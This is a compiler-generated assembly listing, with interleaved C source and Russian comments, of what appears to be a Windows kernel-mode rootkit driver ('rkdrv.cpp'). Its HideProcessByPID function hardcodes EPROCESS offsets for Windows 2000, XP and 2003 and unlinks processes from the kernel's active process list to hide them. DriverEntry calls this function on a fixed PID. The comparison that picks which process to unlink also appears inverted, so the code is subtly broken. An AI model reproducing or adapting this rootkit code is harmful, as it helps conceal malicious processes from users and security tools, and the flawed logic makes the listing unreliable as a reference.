; Listing generated by Microsoft (R) Optimizing Compiler Version 13.10.3077 

	TITLE	.\rkdrv.cpp
	.386P
include listing.inc
if @Version gt 510
.model FLAT
else
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
_DATA	ENDS
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
_BSS	ENDS
$$SYMBOLS	SEGMENT BYTE USE32 'DEBSYM'
$$SYMBOLS	ENDS
_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
_TLS	ENDS
;	COMDAT ??_C@_02GMHACPFF@?$CFu?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFPDHMAM@Hide?5Process?5?$CFu?$AA@
CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
CONST	ENDS
;	COMDAT ?HideProcessByPID@@YGXH@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
_TEXT	ENDS
FLAT	GROUP _DATA, CONST, _BSS
	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
endif

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	?HideProcessByPID@@YGXH@Z			; HideProcessByPID
PUBLIC	??_C@_02GMHACPFF@?$CFu?$AA@			; `string'
PUBLIC	??_C@_0BA@JFPDHMAM@Hide?5Process?5?$CFu?$AA@	; `string'
EXTRN	__imp__IoGetCurrentProcess@0:NEAR
EXTRN	_NtBuildNumber:DWORD
EXTRN	_DbgPrint:NEAR
;	COMDAT ??_C@_02GMHACPFF@?$CFu?$AA@
; File e:\delphi5\delphi7\projects\bhv\rkkm3\rkdrv.cpp
CONST	SEGMENT
??_C@_02GMHACPFF@?$CFu?$AA@ DB '%u', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFPDHMAM@Hide?5Process?5?$CFu?$AA@
CONST	SEGMENT
??_C@_0BA@JFPDHMAM@Hide?5Process?5?$CFu?$AA@ DB 'Hide Process %u', 00H ; `string'
; Function compile flags: /Ogty
CONST	ENDS
;	COMDAT ?HideProcessByPID@@YGXH@Z
_TEXT	SEGMENT
_CurrentProcessAPL$ = -4				; size = 4
_PID$ = 8						; size = 4
?HideProcessByPID@@YGXH@Z PROC NEAR			; HideProcessByPID, COMDAT

; 15   : {

	push	ecx

; 16   : 	// Смещения полей структуры EPROCESS
; 17   : 	ULONG ActiveProcessLinkOffset = 0; // Структура ActiveProcessLinks
; 18   : 	ULONG ProcessNameOffset = 0;       // Имя процесса
; 19   : 	ULONG PIDOffset = 0;               // PID процесса
; 20   :     switch (*NtBuildNumber) {

	mov	eax, DWORD PTR _NtBuildNumber
	movzx	eax, WORD PTR [eax]
	cmp	eax, 2195				; 00000893H
	push	ebx
	push	ebp
	je	SHORT $L9927
	cmp	eax, 2600				; 00000a28H
	je	SHORT $L9928
	cmp	eax, 3790				; 00000eceH
	jne	SHORT $L9919

; 31   :      case 3790:  // W2K3
; 32   :       ActiveProcessLinkOffset = 0x98;

	mov	ebx, 152				; 00000098H

; 33   : 	  ProcessNameOffset       = 0x164;
; 34   : 	  PIDOffset               = 0x094;

	mov	ebp, 148				; 00000094H

; 35   : 	  break;

	jmp	SHORT $L9968
$L9928:

; 25   : 	  break;
; 26   :      case 2600:   // Win XP
; 27   :       ActiveProcessLinkOffset = 0x88;

	mov	ebx, 136				; 00000088H

; 28   : 	  ProcessNameOffset       = 0x174;
; 29   : 	  PIDOffset               = 0x084;

	mov	ebp, 132				; 00000084H

; 30   : 	  break;

	jmp	SHORT $L9968
$L9927:

; 21   :      case  2195:  // Win 2k
; 22   :       ActiveProcessLinkOffset = 0xA0;

	mov	ebx, 160				; 000000a0H

; 23   : 	  ProcessNameOffset       = 0x01FC;
; 24   : 	  PIDOffset               = 0x09C;

	mov	ebp, 156				; 0000009cH
$L9968:

; 36   : 	}	
; 37   : 	if (ActiveProcessLinkOffset == 0) return;
; 38   : 	PEPROCESS   CurrentProcess    = PsGetCurrentProcess(); 

	call	DWORD PTR __imp__IoGetCurrentProcess@0

; 39   : 	if (!CurrentProcess) return;

	test	eax, eax
	je	SHORT $L9919
	push	esi

; 40   : 	PLIST_ENTRY CurrentProcessAPL = (PLIST_ENTRY)((ULONG)CurrentProcess + ActiveProcessLinkOffset);

	lea	esi, DWORD PTR [eax+ebx]
	push	edi
	mov	DWORD PTR _CurrentProcessAPL$[esp+20], esi
$L9939:

; 41   : 	PLIST_ENTRY ProcessAPL        = CurrentProcessAPL;
; 42   : 	ULONG ProcessPID;
; 43   : 	PCHAR ProcessName;
; 44   : 	do  {
; 45   : 	  ProcessPID  = *(PULONG)((ULONG)ProcessAPL - ActiveProcessLinkOffset + PIDOffset);

	mov	ecx, esi
	sub	ecx, ebx
	mov	edi, DWORD PTR [ecx+ebp]

; 46   : 	  ProcessName = (PCHAR)((ULONG)ProcessAPL - ActiveProcessLinkOffset + ProcessNameOffset);
; 47   : 	  DbgPrint("%u", ProcessPID);	

	push	edi
	push	OFFSET FLAT:??_C@_02GMHACPFF@?$CFu?$AA@
	call	_DbgPrint

; 48   : 	  if (ProcessPID != PID) {

	mov	eax, DWORD PTR _PID$[esp+24]
	add	esp, 8
	cmp	edi, eax
	je	SHORT $L9947

; 49   : 		ProcessAPL->Flink->Blink = ProcessAPL->Blink;

	mov	edx, DWORD PTR [esi]
	mov	eax, DWORD PTR [esi+4]
	mov	DWORD PTR [edx+4], eax

; 50   : 		ProcessAPL->Blink->Flink = ProcessAPL->Flink;

	mov	ecx, DWORD PTR [esi+4]
	mov	edx, DWORD PTR [esi]

; 51   : 		DbgPrint("Hide Process %u", ProcessPID);	

	push	edi
	push	OFFSET FLAT:??_C@_0BA@JFPDHMAM@Hide?5Process?5?$CFu?$AA@
	mov	DWORD PTR [ecx], edx
	call	_DbgPrint
	add	esp, 8
$L9947:

; 52   : 	  }
; 53   : 	  ProcessAPL = ProcessAPL -> Flink;

	mov	esi, DWORD PTR [esi]

; 54   : 	} while (ProcessAPL != CurrentProcessAPL);

	cmp	esi, DWORD PTR _CurrentProcessAPL$[esp+20]
	jne	SHORT $L9939
	pop	edi
	pop	esi
$L9919:
	pop	ebp
	pop	ebx

; 55   : }

	pop	ecx
	ret	4
?HideProcessByPID@@YGXH@Z ENDP				; HideProcessByPID
_TEXT	ENDS
PUBLIC	?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ; DriverEntry
; Function compile flags: /Ogty
;	COMDAT ?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z
_TEXT	SEGMENT
_pDriverObject$ = 8					; size = 4
_pusRegistryPath$ = 12					; size = 4
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z PROC NEAR ; DriverEntry, COMDAT

; 60   : 	HideProcessByPID(1204);

	push	1204					; 000004b4H
	call	?HideProcessByPID@@YGXH@Z		; HideProcessByPID

; 61   : 	// Возврат результата инициализации
; 62   : 	return STATUS_NOT_IMPLEMENTED;

	mov	eax, -1073741822			; c0000002H

; 63   : }

	ret	8
?DriverEntry@@YGJPAU_DRIVER_OBJECT@@PAU_UNICODE_STRING@@@Z ENDP ; DriverEntry
_TEXT	ENDS
END
